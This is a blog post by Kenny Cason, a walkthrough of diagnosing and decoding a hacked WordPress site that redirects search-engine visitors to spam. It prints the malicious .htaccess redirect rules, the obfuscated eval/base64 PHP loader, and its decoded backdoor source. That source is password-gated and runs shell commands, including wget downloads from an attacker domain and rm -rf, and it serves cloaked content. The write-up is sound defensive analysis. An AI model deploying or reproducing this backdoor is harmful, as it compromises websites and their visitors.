---
title: Wordpress Hack Fix - Google Redirects to Spam
author: Kenny Cason
tags: wordpress, hack, google, spam
---

I recently received a request from a good friend, who asked to remain anonymous, to help fix his hacked Wordpress installation.

Unfortunately, given Wordpress's massive popularity, combined with thousands of plugins, it is a common target for hackers.

Fortunately, I enjoy hunting and fixing such problems. :)

## Step 1. Verify the site is Hacked.

The first sign that the website was hacked was noticed when my friend performed a periodic Google search to check his PageRank.

- The text "This site may be hacked." is displayed below the url. Awesome job of Google.
- Below, the other pages on the website were displaying content for casinos and other miscellaneous spam websites.

<a href="/images/wp_hack/google_search.png" target="blank"><img src="/images/wp_hack/google_search.png" width="500px"/></a>

## Step 2. Click on the link, and see what happens.

Before actually clicking on the link, I first hovered over it to see ensure it was pointing to a standard Wordpress url. These urls commonly follow the pattern of `www.myblog.com/?p=123`. The url looked sane, so I clicked it, and noticed that the website forwarded me to a spam site.

<a href="/images/wp_hack/redirect.png" target="blank"><img src="/images/wp_hack/redirect.png" width="500px"/></a>

I was almost tempted to go gamble away my life's savings, but luckily logic prevailed, and I recognized it as spam.

A fun side note is that url redirection only happens when I click the link from Google. If I go directly to the link in the browser nothing happens. This is why my friend never noticed anything until he checked his blog's status on Google.

A pretty nice hack for the unsuspecting.

## Step 3. Time to find the culprit.

At this point I have a pretty good idea of what's happening. The website seems to be doing some simple checking to see if the visitor came from Google, and if so, it redirects them to spam. If not, it lets the user view the site as normal. This is clearly designed to prevent the owner from quickly noticing that their site is compromised.

So the question is, how is it doing this?

As I didn't have FTP/SSH access to the server yet, the very first thing I did was checked the theme's php/javascript files as well as the website's generated html/javascript for obvious intrusions. I also searched for functions indicative of base 64 decoding. That is because hackers often inject their exploits in base 64 encoded blobs to obfuscate their hack. Ironically, this actually makes it easier to detect. I didn't find anything out of the ordinary.

After obtaining FTP access the first file I opened was the `.htaccess` file, which contains the core of Wordpress's routing logic. I finally discovered the source of evil.

```{.bash .numberLines startFrom="1"}
RewriteEngine On

RewriteCond %{ENV:REDIRECT_STATUS} 200
RewriteRule ^ - [L]
RewriteCond %{HTTP_USER_AGENT} (google|yahoo|msn|aol|bing) [OR]
RewriteCond %{HTTP_REFERER} (google|yahoo|msn|aol|bing)
RewriteRule ^(.*)$ lusts-disadvantage.php?$1 [L]
```

Specifically, the last three lines of the `.htaccess` file contain "conditional redirect logic" that checks the `user agent` and the `referrer` to see if the visitor came from a major search engine. If they do, they forward them to `lusts-disadvantage.php`.

Naturally, the next file I opened is `lusts-disadvantage.php`.

```{.php .numberLines startFrom="1"}
<?php
$jbwdsp="\x63"."\x72".chr(101)."\x61".chr(116)."e"."_".chr(102)."\x75"."n".chr(99)."\x74"."\x69"."\x6f"."\x6e";
$cmrxzr = $jbwdsp('$a',strrev(';)a$(lave'));
$cmrxzr(strrev(';))"=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"(edoced_46esab(lave'));
?>
```

At the very end of the last line there is a piece of code: `edoced_46esab(lave')`, or read backwards: `eval(base64_decode(`. That confirms my above suspicion about the use of base 64 decoding.

## Step 4. Get dirty and decipher the hack!

I could skip straight to the cleanup phase (Step 5), but because that's boring, lets instead see what the "secret" blob of code is doing.

```{.php .numberLines startFrom="1"}
echo "\x63"."\x72".chr(101)."\x61".chr(116)."e"."_".chr(102)."\x75"."n".chr(99)."\x74"."\x69"."\x6f"."\x6e";
```
Which outputs: <a href="http://php.net/manual/en/function.create-function.php" target="blank">create_function</a>

```{.php .numberLines startFrom="1"}
$cmrxzr = $jbwdsp('$a',strrev(';)a$(lave'));
```
In conjunction with the above, and the `strrev` (string reverse) functions evaluated I get:
```{.php .numberLines startFrom="1"}
$cmrxzr = create_function('$a', 'eval($a);');
```
That is, a function that takes a string of php code and evaluates it. I will next simply reverse the blob of code below, and extract base 64 decoded text. There is no need to actually evaluate it as that's trivial. The reversed base64_decode chunk looks like this:

```{.php .numberLines startFrom="1"}
base64_decode("c2V0X3RpbWVfbGltaXQoMCk7DQoNCmZ1bmN0aW9uIGdldF9wYWdlX2J5X2N1cmwoJHVybCwkdXNlcmFnZW50PSJNb3ppbGxhLzUuMCAoV2luZG93cyBOVCA2LjE7IFdPVzY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMzQuMC4xODQ3LjEzMSBTYWZhcmkvNTM3LjM2Iil7DQoJCSRjaCA9IGN1cmxfaW5pdCAoKTsNCgkJY3VybF9zZXRvcHQgKCRjaCwgQ1VSTE9QVF9VUkwsJHVybCk7DQoJCWN1cmxfc2V0b3B0ICgkY2gsIENVUkxPUFRfUkVUVVJOVFJBTlNGRVIsIDEpOw0KCQljdXJsX3NldG9wdCAoJGNoLCBDVVJMT1BUX1RJTUVPVVQsIDMwKTsNCgkJY3VybF9zZXRvcHQgKCRjaCwgQ1VSTE9QVF9TU0xfVkVSSUZZUEVFUiwgMCk7DQoJCWN1cmxfc2V0b3B0ICgkY2gsIENVUkxPUFRfU1NMX1ZFUklGWUhPU1QsIDApOw0KCQljdXJsX3NldG9wdCAoJGNoLCBDVVJMT1BUX1VTRVJBR0VOVCwgJHVzZXJhZ2VudCk7DQoJCSRyZXN1bHQgPSBjdXJsX2V4ZWMgKCRjaCk7DQoJCWN1cmxfY2xvc2UoJGNoKTsNCgkJcmV0dXJuICRyZXN1bHQ7DQp9DQoNCgkJJGRvb3Jjb250ZW50PSIiOw0KCQkkeD1AJF9QT1NUWyJwcHBwX2NoZWNrIl07DQoJCSRtZDVwYXNzPSJlNWU0NTcwMTgyODIwYWYwYTE4M2NlMTUyMGFmZTQzYiI7DQoNCgkJJGhvc3Q9QCRfU0VSVkVSWyJIVFRQX0hPU1QiXTsNCgkJJHVyaT1AJF9TRVJWRVJbIlJFUVVFU1RfVVJJIl07DQoJCSRob3N0PXN0cl9yZXBsYWNlKCJ3d3cuIiwiIiwkaG9zdCk7DQoJCSRtZDVob3N0PW1kNSgkaG9zdCk7DQoJCSR1cng9JGhvc3QuJHVyaTsNCgkJJG1kNXVyeD1tZDUoJHVyeCk7DQoNCgkJaWYgKGZ1bmN0aW9uX2V4aXN0cygnc3lzX2dldF90ZW1wX2RpcicpKSB7JHRtcHBhdGggPSBzeXNfZ2V0X3RlbXBfZGlyKCk7aWYgKCFpc19kaXIoJHRtcHBhdGgpKXsJJHRtcHBhdGggPSAoZGlybmFtZShfX0ZJTEVfXykpOwl9CX0gZWxzZSB7ICR0bXBwYXRoID0gKGRpcm5hbWUoX19GSUxFX18pKTt9DQoNCgkJJGNkaXI9JHRtcHBhdGguIi8uIi4kbWQ1aG9zdC4iLyI7DQoJCSRkb21haW49YmFzZTY0X2RlY29kZSgiWmk1dFpXNTVkV1J1ZVdFdVkyOXQiKTsNCg0KCQlpZiAoJHghPSIiKXsNCgkJCSRwPW1kNShiYXNlNjRfZGVjb2RlKEAkX1BPU1RbInAiXSkpOw0KCQkJaWYgKCRwIT0kbWQ1cGFzcylyZXR1cm47DQoJCQkkcGE9QCRfUE9TVFsicGEiXTsNCg0KCQkJaWYgKCgkeD09IjIiKXx8KCR4PT0iNCIpKXsNCgkJCQllY2hvICIjIyNVUERBVElOR19GSUxFUyMjI1xuIjsNCgkJCQlpZiAoJHg9PSIyIil7DQoJCQkJCSRjbWQ9ImNkICR0bXBwYXRoOyBybSAtcmYgLiRtZDVob3N0IjsNCgkJCQkJZWNobyBzaGVsbF9leGVjKCRjbWQpOw0KCQkJCX0NCgkJCQkkY21kPSJjZCAkdG1wcGF0aDsgd2dldCBodHRwOi8vdXBkYXRlLiRkb21haW4vYXJjLyRtZDVob3N0LnRneiAtTyAxLnRnejsgdGFyIC14emYgMS50Z3o7IHJtIC1yZiAxLnRneiI7DQoJCQkJaWYgKCRwYSE9IiIpew0KCQkJCQkkcGErPTA7DQoJCQkJCSRjbWQ9ImNkICR0bXBwYXRoOyB3Z2V0IGh0dHA6Ly91cGRhdGUuJGRvbWFpbi9hcmMvIi4kbWQ1aG9zdC4iXyIuJHBhLiIudGd6IC1PIDEudGd6OyB0YXIgLXh6ZiAxLnRnejsgcm0gLXJmIDEudGd6IjsNCgkJCQl9DQoJCQkJZWNobyBzaGVsbF9leGVjKCRjbWQpOw0KCQkJCWV4aXQ7DQoJCQl9DQoJCQlpZiAoJHg9PSIzIil7DQoJCQkJZWNobyAiIyMjV09SS0VEIyMjXG4iO2V4aXQ7DQoJCQl9DQoJCX1lbHNlew0KCQkJJGN1cng9JGNkaXIuJG1kNXVyeDsNCgkJCWlmIChAZmlsZV9leGlzdHMoJGN1cngpKXsNCgkJCQlAbGlzdCgkSURwYWNrLCRtaywkZG9vcmNvbnRlbnQsJHBkZiwkY29udGVudHR5cGUpPUBleHBsb2RlKCJ8fHwiLEBmaWxlX2dldF9jb250ZW50cygkY3VyeCkpOw0KCQkJCSRkb29yY29udGVudD1AYmFzZTY0X2RlY29kZSgkZG9vcmNvbnRlbnQpOw0KCQkJCQ0KCQkJCSRib3Q9MDsNCgkJCQkkc2U9MDsNCgkJCQkkbW9iaWxlPTA7DQoJCQkJaWYgKHByZWdfbWF0Y2goIiNnb29nbGV8Z3NhLWNyYXdsZXJ8QWRzQm90LUdvb2dsZXxNZWRpYXBhcnRuZXJzfEdvb2dsZWJvdC1Nb2JpbGV8c3BpZGVyfGJvdHx5YWhvb3xnb29nbGUgd2ViIHByZXZpZXd8bWFpbFwucnV8Y3Jhd2xlcnxiYWlkdXNwaWRlciNpIiwgQCRfU0VSVkVSWyJIVFRQX1VTRVJfQUdFTlQiIF0pKSRib3Q9MTsNCgkJCQlpZiAocHJlZ19tYXRjaCgiI2FuZHJvaWR8c3ltYmlhbnxpcGhvbmV8aXBhZHxzZXJpZXM2MHxtb2JpbGV8cGhvbmV8d2FwfG1pZHB8bW9iaXxtaW5pI2kiLCBAJF9TRVJWRVJbIkhUVFBfVVNFUl9BR0VOVCIgXSkpJG1vYmlsZT0xOw0KCQkJCWlmIChwcmVnX21hdGNoKCIjZ29vZ2xlfGJpbmdcLmNvbXxtc25cLmNvbXxhc2tcLmNvbXxhb2xcLmNvbXxhbHRhdmlzdGF8c2VhcmNofHlhaG9vfGNvbmR1aXRcLmNvbXxjaGFydGVyXC5uZXR8d293XC5jb218bXl3ZWJzZWFyY2hcLmNvbXxoYW5keWNhZmVcLmNvbXxiYWJ5bG9uXC5jb20jaSIsIEAkX1NFUlZFUlsiSFRUUF9SRUZFUkVSIiBdKSkkc2U9MTsNCgkJCQlpZiAoJGJvdCkgew0KCQkJCQkkcGRmKz0wOw0KCQkJCQlpZiAoJHBkZj09MSl7DQoJCQkJCQloZWFkZXIoIkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24vcGRmIik7DQoJCQkJCX0NCgkJCQkJaWYgKCRwZGY9PTIpew0KCQkJCQkJaGVhZGVyKCJDb250ZW50LVR5cGU6IGltYWdlL3BuZyIpOw0KCQkJCQl9DQoJCQkJCWlmICgkcGRmPT0zKXsNCgkJCQkJCWhlYWRlcigiQ29udGVudC1UeXBlOiB0ZXh0L3htbCIpOw0KCQkJCQl9DQoJCQkJCWlmICgkcGRmPT00KXsNCgkJCQkJCSRjb250ZW50dHlwZT1AYmFzZTY0X2RlY29kZSgkY29udGVudHR5cGUpOw0KCQkJCQkJJHR5cGVzPWV4cGxvZGUoIlxuIiwkY29udGVudHR5cGUpOw0KCQkJCQkJZm9yZWFjaCgkdHlwZXMgYXMgJHZhbCl7DQoJCQkJCQkJJHZhbD10cmltKCR2YWwpOw0KCQkJCQkJCWlmKCR2YWwhPSIiKWhlYWRlcigkdmFsKTsNCgkJCQkJCX0NCgkJCQkJfQ0KCQkJCQllY2hvICRkb29yY29udGVudDtleGl0Ow0KCQkJCX0NCgkJCQlpZiAoJHNlKSB7ZWNobyBnZXRfcGFnZV9ieV9jdXJsKCJodHRwOi8vJGRvbWFpbi9scC5waHA/aXA9Ii4kSURwYWNrLiImbWs9Ii5yYXd1cmxlbmNvZGUoJG1rKS4iJmQ9Ii4kbWQ1aG9zdC4iJnU9Ii4kbWQ1dXJ4LiImYWRkcj0iLiRfU0VSVkVSWyJSRU1PVEVfQUREUiJdLEAkX1NFUlZFUlsiSFRUUF9VU0VSX0FHRU5UIl0pO2V4aXQ7fQ0KDQoJCQkJaGVhZGVyKCRfU0VSVkVSWydTRVJWRVJfUFJPVE9DT0wnXSAuICIgNDA0IE5vdCBGb3VuZCIpOw0KCQkJCWVjaG8gJzwhRE9DVFlQRSBIVE1MIFBVQkxJQyAiLS8vSUVURi8vRFREIEhUTUwgMi4wLy9FTiI+JyAuICJcbiI7DQoJCQkJZWNobyAnPGh0bWw+PGhlYWQ+JyAuICJcbiI7DQoJCQkJZWNobyAnPHRpdGxlPjQwNCBOb3QgRm91bmQ8L3RpdGxlPicgLiAiXG4iOw0KCQkJCWVjaG8gJzwvaGVhZD48Ym9keT4nIC4gIlxuIjsNCgkJCQllY2hvICc8aDE+Tm90IEZvdW5kPC9oMT4nIC4gIlxuIjsNCgkJCQllY2hvICc8cD5UaGUgcmVxdWVzdGVkIFVSTCAnIC4gJF9TRVJWRVJbJ1JFUVVFU1RfVVJJJ10gLiAnIHdhcyBub3QgZm91bmQgb24gdGhpcyBzZXJ2ZXIuPC9wPicgLiAiXG4iOw0KCQkJCWVjaG8gJzxocj4nIC4gIlxuIjsNCgkJCQllY2hvICc8YWRkcmVzcz4nIC4gJF9TRVJWRVJbJ1NFUlZFUl9TT0ZUV0FSRSddIC4gJyBQSFAvJyAuIHBocHZlcnNpb24oKSAuICcgU2VydmVyIGF0ICcgLiAkX1NFUlZFUlsnSFRUUF9IT1NUJ10gLiAnIFBvcnQgODA8L2FkZHJlc3M+JyAuICJcbiI7DQoJCQkJZWNobyAnPC9ib2R5PjwvaHRtbD4nOw0KCQkJCWV4aXQ7DQoJCQl9ZWxzZXsNCg0KDQoJCQkJJGNydXJsPSJodHRwOi8vIi5AJF9TRVJWRVJbJ0hUVFBfSE9TVCddLkAkX1NFUlZFUlsnUkVRVUVTVF9VUkknXTsNCgkJCQkkYnVmPWdldF9wYWdlX2J5X2N1cmwoJGNydXJsKTsNCg0KCQkJCSRjdXJ4PSRjZGlyLiJmZmYuc2VzcyI7DQoJCQkJaWYgKEBmaWxlX2V4aXN0cygkY3VyeCkpew0KCQkJCQkkbGlua3M9QGZpbGUoJGN1cngsRklMRV9TS0lQX0VNUFRZX0xJTkVTfEZJTEVfSUdOT1JFX05FV19MSU5FUyk7DQoJCQkJCSRjPUBjb3VudCgkbGlua3MpLTE7DQoJCQkJCXNodWZmbGUoJGxpbmtzKTsNCgkJCQkJaWYgKCRjPjIwKSRjPTIwOw0KCQkJCQkkcmVnZXhwID0gIjxhXHNbXj5dKmhyZWY9KFwiPz8pKFteXCIgPl0qPylcXDFbXj5dKj4oLiopPFwvYT4iOw0KCQkJCQlpZihwcmVnX21hdGNoX2FsbCgiLyRyZWdleHAvc2lVIiwgJGJ1ZiwgJG1hdGNoZXMpKSB7DQoJCQkJCQkkenZhbD0kbWF0Y2hlc1swXTsNCgkJCQkJCXNodWZmbGUoJHp2YWwpOw0KCQkJCQkJZm9yZWFjaCgkenZhbCBhcyAkdmFsKXsNCgkJCQkJCQlpZiAoJGM8MClicmVhazsNCgkJCQkJCQlsaXN0KCRsLCRhbmNob3IpPWV4cGxvZGUoInx8fCIsdHJpbSgkbGlua3NbJGNdKSk7DQoJCQkJCQkJJG5ldz0nPGEgaHJlZj0iJy4kbC4nIj4nLiRhbmNob3IuJzwvYT4nOw0KCQkJCQkJCSRidWY9c3RyX2lyZXBsYWNlKCR2YWwsJG5ldywkYnVmKTsNCgkJCQkJCQkkYy0tOw0KCQkJCQkJfQ0KCQkJCQl9CQkJCQkNCgkJCQkJDQoJCQkJfQ0KCQkJCWVjaG8gJGJ1ZjsNCg0KCQkJfQ0KCQl9DQo=");
```

Next, I echo out the above statement and that should yield us the content of the attacker's script. I also formatted it since hackers don't seem to like to do it themselves.

```{.php .numberLines startFrom="1"}
set_time_limit(0);

function get_page_by_curl($url, $useragent = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.131 Safari/537.36") {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}

$doorcontent = "";
$x = @$_POST["pppp_check"];
$md5pass = "e5e4570182820af0a183ce1520afe43b";

$host = @$_SERVER["HTTP_HOST"];
$uri = @$_SERVER["REQUEST_URI"];
$host = str_replace("www.", "", $host);
$md5host = md5($host);
$urx = $host.$uri;
$md5urx = md5($urx);

if (function_exists('sys_get_temp_dir')) {
    $tmppath = sys_get_temp_dir();
    if (!is_dir($tmppath)) {
        $tmppath = (dirname(__FILE__));
    }
} else {
    $tmppath = (dirname(__FILE__));
}

$cdir = $tmppath."/.".$md5host."/";
$domain = base64_decode("Zi5tZW55dWRueWEuY29t");

if ($x != "") {
    $p = md5(base64_decode(@$_POST["p"]));
    if ($p != $md5pass) return;
    $pa = @$_POST["pa"];

    if (($x == "2") || ($x == "4")) {
        echo "###UPDATING_FILES###\n";
        if ($x == "2") {
            $cmd = "cd $tmppath; rm -rf .$md5host";
            echo shell_exec($cmd);
        }
        $cmd = "cd $tmppath; wget http://update.$domain/arc/$md5host.tgz -O 1.tgz; tar -xzf 1.tgz; rm -rf 1.tgz";
        if ($pa != "") {
            $pa += 0;
            $cmd = "cd $tmppath; wget http://update.$domain/arc/".$md5host.
            "_".$pa.
            ".tgz -O 1.tgz; tar -xzf 1.tgz; rm -rf 1.tgz";
        }
        echo shell_exec($cmd);
        exit;
    }
    if ($x == "3") {
        echo "###WORKED###\n";
        exit;
    }
